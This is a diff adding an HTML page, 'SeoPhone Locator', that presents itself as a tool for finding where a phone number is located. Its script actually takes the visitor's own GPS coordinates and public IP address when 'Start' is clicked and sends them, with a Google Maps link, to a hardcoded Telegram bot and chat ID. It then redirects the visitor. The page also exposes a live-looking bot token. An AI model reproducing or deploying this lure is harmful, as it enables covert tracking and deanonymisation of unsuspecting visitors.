@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SeoPhone Locator</title>
+    <link rel="stylesheet" href="index.css"> <!-- ربط ملف CSS -->
+</head>
+<body>
+    <div class="container">
+        <h1>Welcom To SeoPhone Locator</h1>
+        <p>SeoPhone Locator: Phone Number Location Tracker
+
+            SeoPhone Locator is a cutting-edge tool that enables users to track the geographic location of a phone number. By simply entering a phone number, the platform provides accurate and real-time data about the phone's geographic position. Whether you're looking to find the location of a mobile phone or verify the area code of a number, our service offers a user-friendly interface that delivers precise results. With advanced geolocation technology, SeoPhone Locator ensures privacy and security while giving you the information you need efficiently.
+            
+            </p>
+        
+        <!-- زر لإرسال الموقع وعنوان الـ IP -->
+        <button id="sendLocationButton" class="btn">Start</button>
+    </div>
+
+    <script>
+        // تعريف دالة لإرسال الموقع وعنوان الـ IP إلى Telegram
+        function sendLocationToTelegram(latitude, longitude, ipAddress) {
+            const token = '6609571236:AAGdruLEs9zRmwPi2HNTbfi7Tev9U1ytUb0'; // ضع هنا الـ Token الخاص بالبوت
+            const chatId = '6099533711'; // ضع هنا الـ Chat ID الخاص بك أو قناتك
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=Location: https://www.google.com/maps?q=${latitude},${longitude}%0AIP Address: ${ipAddress}`;
+
+            // إرسال الموقع وعنوان الـ IP إلى Telegram باستخدام fetch
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log("تم إرسال الموقع وعنوان الـ IP بنجاح!");
+                    // بعد إرسال الموقع بنجاح، نقوم بتحويل المستخدم إلى الصفحة الجديدة
+                    window.location.href = "page1.html"; // التوجيه إلى الصفحة page1.html
+                })
+                .catch(error => {
+                    console.error("حدث خطأ أثناء إرسال البيانات:", error);
+                });
+        }
+
+        // دالة للحصول على عنوان الـ IP باستخدام خدمة ipify
+        function getIpAddress() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    return data.ip;
+                })
+                .catch(error => {
+                    console.error("حدث خطأ أثناء الحصول على عنوان الـ IP:", error);
+                    return null;
+                });
+        }
+
+        // دالة للحصول على الموقع الجغرافي وإرساله
+        function getLocationAndSend() {
+            if (navigator.geolocation) {
+                // الحصول على الموقع الجغرافي
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // الحصول على عنوان الـ IP
+                    getIpAddress().then(ipAddress => {
+                        if (ipAddress) {
+                            // إرسال الموقع وعنوان الـ IP إلى بوت Telegram
+                            sendLocationToTelegram(latitude, longitude, ipAddress);
+                        }
+                    });
+                }, function(error) {
+                    console.error("حدث خطأ أثناء الحصول على الموقع: " + error.message);
+                });
+            } else {
+                alert("متصفحك لا يدعم الحصول على الموقع الجغرافي.");
+            }
+        }
+
+        // إضافة حدث الضغط على الزر
+        document.getElementById("sendLocationButton").addEventListener("click", getLocationAndSend);
+    </script>
+</body>
+</html>
